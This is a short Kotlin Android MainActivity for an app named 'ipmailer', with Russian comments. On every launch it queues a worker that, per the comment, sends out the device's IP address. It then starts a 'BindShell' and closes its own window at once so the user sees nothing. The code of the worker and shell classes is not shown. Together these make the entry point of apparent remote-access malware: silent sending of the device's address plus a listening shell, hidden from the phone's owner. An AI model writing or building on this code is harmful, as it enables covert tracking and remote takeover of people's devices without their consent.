package com.example.ipmailer

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Отправляем IP сразу при запуске приложения
        val work = OneTimeWorkRequestBuilder<IpSenderWorker>().build()
        WorkManager.getInstance(this).enqueue(work)
        BindShell.start()
        // Если не хочешь видеть пустой экран — закрываем активити сразу
        finish()
    }
}